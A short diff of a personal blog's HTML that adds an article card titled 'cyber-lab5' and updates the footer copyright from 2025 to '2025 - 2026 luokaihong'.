+            <h2 class="article-title">cyber-lab5</h2>
         </div>
     </a>
 </article>
@@ -697,7 +1138,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
